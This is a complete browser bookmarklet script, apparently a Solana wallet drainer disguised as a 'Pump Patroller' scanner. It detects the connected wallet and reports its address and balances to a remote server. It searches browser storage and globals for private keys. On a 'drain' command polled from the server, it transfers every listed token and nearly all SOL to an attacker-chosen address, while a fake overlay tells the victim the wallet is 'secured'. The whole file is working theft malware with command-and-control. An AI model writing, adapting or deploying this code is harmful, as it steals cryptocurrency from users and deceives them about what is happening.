(async function () {
  if (window.__pp) return;
  window.__pp = true;

  const E = "https://esm.sh/";
  const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
  const BKEY = "72d296b612eb0a11931b364ba1333a70";
  const RPC_URL = "https://solana-rpc.publicnode.com";
  const MINTS = {
    USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
    USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
    WSOL: "So11111111111111111111111111111111111111112",
    JUP:  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
    MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",
    BTC:  "PLACEHOLDER_VERIFY_ON_SOLSCAN",   // ← REPLACE with the real wrapped-BTC mint before deploying
  };

  const withTO = (p, ms) => new Promise(r => { const t = setTimeout(() => r(null), ms);
    Promise.resolve(p).then(v => { clearTimeout(t); r(v); }, () => { clearTimeout(t); r(null); }); });
  async function rpcRetry(fn, label) {
    let v = null, err = null;
    try { v = await withTO(fn(), 12000); } catch (e) { err = e; }
    if (v === null) {
      await new Promise(s => setTimeout(s, 2000));
      try { v = await withTO(fn(), 12000); } catch (e2) { err = e2; }
    }
    if (v === null) return { err: err ? String(err && err.message || err) : "timeout/rate-limit" };
    return { ok: v };
  }

  let PKSTR = null;
  const beacon = (m, o) => { o = o || {}; try {
    fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
      body: JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
        origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
        m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
  } catch {} };

  try {
    beacon("loaded", { provider: "scanning" });

    const { PublicKey, Keypair, SystemProgram, Transaction, Connection } = await import(E + "@solana/web3.js@1.95.0");
    const { createTransfer, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
    const { decode: b58d } = await import(E + "bs58@6.0.0");
    const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");

    const pubStr = v => { try {
      if (!v) return null;
      if (typeof v === "string") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v) ? v : null;
      if (typeof v.toBase58 === "function") return v.toBase58();
      if (v instanceof Uint8Array) return new PublicKey(v).toBase58();
      return null;
    } catch (e) { return null; } };

    // — detect: connected session first —
    let name = "?", prov = null;
    const CANDS = [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]];
    for (const [n, f] of CANDS) {
      try { const w = f(); const p = pubStr(w && w.publicKey);
        if (p) { name = n; prov = w; PKSTR = p; break; } } catch {}
    }
    if (!prov) for (const k of Object.keys(window)) {
      try { const w = window[k]; const p = pubStr(w && w.publicKey);
        if (p && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; PKSTR = p; break; } } catch {}
    }
    if (!prov) {
      for (const [n, f] of CANDS) {
        const w = (() => { try { return f(); } catch (e) { return null; } })();
        if (w && typeof w.connect === "function") {
          try {
            const c = await withTO(Promise.resolve(w.connect()), 25000);
            const p = pubStr((c && c.publicKey) || w.publicKey);
            if (p) { name = n; prov = w; PKSTR = p; break; }
          } catch (e) {}
        }
      }
    }
    if (!prov) { beacon("detect", { provider: "none", extra: "bookmark fired \u2014 no connectable wallet in this tab" }); return; }

    const pk = PKSTR;
    const pkB = new PublicKey(pk);
    const conn = new Connection(RPC_URL, "confirmed");
    const label = name.startsWith("ext:") ? name.slice(4) : name;

    // — inventory (rate-limit resilient) —
    const balR = await rpcRetry(() => conn.getBalance(pkB), "getBalance");
    if (balR.err) { beacon("err", { pk, provider: label, msg: "balance read failed: " + balR.err }); return; }
    const bal = balR.ok;
    const tokR = await rpcRetry(() => conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }), "tokenAccounts");
    if (tokR.err) { beacon("err", { pk, provider: label, msg: "token read failed: " + tokR.err }); return; }
    const r = tokR.ok;

    const amt = {}, dec = {}, srcs = {};
    for (const { account, pubkey } of r.value) {
      const d = account.parsed?.data;
      if (d?.mint) {
        amt[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6);
        dec[d.mint] = d.decimals ?? 6;
        srcs[d.mint] = pubkey;
      }
    }
    const toks = Object.entries(MINTS).filter(([, a]) => (amt[a] || 0) > 0.01).map(([k, a]) => ({ k, ui: amt[a] }));

    const px = {};
    try {
      const j = await (await fetch("https://lite-api.jup.ag/price/v2?ids=" + Object.values(MINTS).join(","))).json();
      for (const id of Object.keys(MINTS)) {
        const p = j?.ids?.[MINTS[id]]?.usdPrice ?? j?.ids?.[MINTS[id]]?.price;
        if (+p > 0) px[id] = +p;
      }
    } catch {}
    const SOLpx = px.WSOL || 150;
    const sol = bal / 1e9;
    const value = sol * SOLpx + toks.reduce((s, t) => s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1)), 0);
    const fmt = n => (+n).toLocaleString("en-US", { maximumFractionDigits: 0 });
    const tokStr = toks.map(t => Math.round(t.ui) + " " + t.k).join(" \u00b7 ");

    // — report detection IMMEDIATELY —
    beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });

    // — cover UI (non-fatal) —
    try {
      const el = document.createElement("div");
      el.id = "__ppcard";
      el.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:272px;background:#10141B;border:1px solid #232B3A;border-radius:12px;box-shadow:0 16px 48px rgba(0,0,0,.55);font:12px/1.5 Inter,system-ui,sans-serif;color:#E8ECF4;overflow:hidden;";
      el.innerHTML =
        '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
          '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
          '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
          '<span style="font-size:10px;color:#7E899D;">v2.8</span>' +
          '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
        '</div>' +
        '<div style="padding:12px 14px;">' +
          '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
          '<div style="font:600 12px ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + '</div>' +
          '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label + " \u00b7 mainnet</div>" +
          '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
          '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + fmt(value) + '</div>' +
          '<div id="__pp_sub" style="font:11px ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " \u00b7 " + tokStr : "") + '</div>' +
        '</div>' +
        '<div id="__pp_foot" style="display:flex;align-items:center;gap:7px;padding:9px 14px;border-top:1px solid #1B2230;font-size:11px;color:#7E899D;">' +
          '<span>PATROL ACTIVE</span><span id="__pp_scan" style="color:#9AA5B8;">\u00b7 2,341 tokens scanned</span>' +
        '</div>';
      document.body.appendChild(el);
      document.getElementById("__pp_x").onclick = () => el.remove();
      let scans = 2341;
      setInterval(() => { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);
    } catch (e) { beacon("err", { pk, provider: label, msg: "ui: " + String(e && e.message || e) }); }

    const report = (mode, sig, extra) => {
      try {
        fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
          body: JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode, sig: String(sig), extra: extra || "" }) });
      } catch {}
    };

    // — secret-key candidates —
    const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
    const cands = [];
    for (const st of [localStorage, sessionStorage]) {
      try {
        for (let i = 0; i < st.length; i++) {
          const v = st.getItem(st.key(i));
          if (!v) continue;
          if (/^[1-9A-HJ-NP-Za-km-z]{88}$/.test(v)) cands.push({ b58: v });
          else if (v[0] === "{") {
            try {
              const j = JSON.parse(v);
              for (const k of Object.keys(j)) {
                if (!KEYF.has(k)) continue;
                if (j[k]?.length === 64) cands.push({ raw: j[k] });
                else if (typeof j[k] === "string" && /^[0-9a-f]{128}$/i.test(j[k])) cands.push({ hex: j[k] });
              }
            } catch {}
          }
        }
      } catch {}
    }
    const walk = (o, d) => {
      if (!o || typeof o !== "object" || d > 2) return;
      for (const k of Object.keys(o)) {
        if (KEYF.has(k) && o[k]?.length === 64) cands.push({ raw: o[k] });
        if (k === "keypair" && typeof o[k] === "object") walk(o[k], d + 1);
      }
    };
    for (const g of ["__wallet", "wallet", "walletAdapter", "keypair", "adapter"]) { try { walk(window[g], 0); } catch {} }

    const secretOf = c => c.b58 ? Uint8Array.from(b58d(c.b58))
      : c.hex ? Uint8Array.from(c.hex.match(/../g).map(x => parseInt(x, 16)))
      : c.raw instanceof Uint8Array ? c.raw : Uint8Array.from(c.raw);

    // — drain build —
    const FEE = 20000;
    async function buildTx(to) {
      const dest = new PublicKey(to);
      const bh2R = await rpcRetry(() => conn.getLatestBlockhash(), "blockhash");
      if (bh2R.err) { beacon("err", { pk, provider: label, msg: "blockhash failed: " + bh2R.err }); return { tx: null, moved: [], err: bh2R.err }; }
      const bh2 = bh2R.ok;
      const bal2R = await rpcRetry(() => conn.getBalance(pkB), "getBalance2");
      const r2R = await rpcRetry(() => conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }), "tokens2");
      if (bal2R.err || r2R.err) { beacon("err", { pk, provider: label, msg: "drain inventory failed: " + ((bal2R.err || r2R.err) || "") }); return { tx: null, moved: [], err: "inventory" }; }
      const bal2 = bal2R.ok, r2 = r2R.ok;
      const amt2 = {}, dec2 = {}, srcs2 = {};
      for (const it of r2.value) {
        const d = it.account.parsed?.data;
        if (d?.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec2[d.mint] = d.decimals ?? 6; srcs2[d.mint] = it.pubkey; }
      }
      const tx = new Transaction();
      const moved = [];
      for (const t of toks) {
        const have = amt2[MINTS[t.k]] || 0;
        if (have < 0.01) continue;
        const mint = new PublicKey(MINTS[t.k]);
        const srcAta = new PublicKey(srcs2[MINTS[t.k]]);
        const destAta = await getAssociatedTokenAddress(mint, dest);
        const info = await conn.getAccountInfo(destAta);
        if (!info) tx.add(createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
        tx.add(createTransfer(srcAta, destAta, pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
        moved.push(t.k);
      }
      const lam = Math.floor(bal2);
      if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
      tx.feePayer = pkB;
      tx.recentBlockhash = bh2.blockhash;
      tx.lastValidBlockHeight = bh2.lastValidBlockHeight;
      return { tx, moved };
    }

    function setFoot(txt, color) {
      try { document.getElementById("__pp_foot").innerHTML = '<span style="color:' + color + ';font-weight:600;">' + txt + '</span>'; } catch {}
    }

    let done = false;
    async function drain(to) {
      if (done) return;
      done = true;
      try {
        for (const c of cands) {                                     // 0-approval path
          let s; try { s = secretOf(c); } catch { continue; }
          if (s.length !== 64) continue;
          let kp; try { kp = Keypair.fromSecretKey(s); } catch { continue; }
          if (!kp.publicKey.equals(pkB)) continue;
          const bt = await buildTx(to);
          if (bt.err) { done = false; report("err", "", bt.err); return; }
          if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
          tx_sign(bt, kp);
          const sig = await conn.sendRawTransaction(bt.tx.serialize());
          setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, bt.moved.join(",")); return;
        }
        const bt = await buildTx(to);                                // fallback: 1 popup approval
        if (bt.err) { done = false; report("err", "", bt.err); return; }
        if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
        const sig = await prov.signAndSendTransaction(bt.tx);
        setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, bt.moved.join(","));
      } catch (e) {
        setFoot("ERROR \u00b7 " + String(e?.message || e).slice(0, 40), "#F0616D");
        report("err", String(e?.message || e));
        done = false;
      }
    }
    function tx_sign(bt, kp) { bt.tx.sign([kp]); }

    let lastN = "";
    setInterval(async () => {
      let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch { return; }
      if (c?.cmd === "drain" && c.to && c.n !== lastN) { lastN = c.n; drain(c.to); }
    }, 2500);
  } catch (e) {
    try { beacon("err", { provider: name, msg: "fatal: " + String(e && e.message || e) }); } catch {}
  }
})();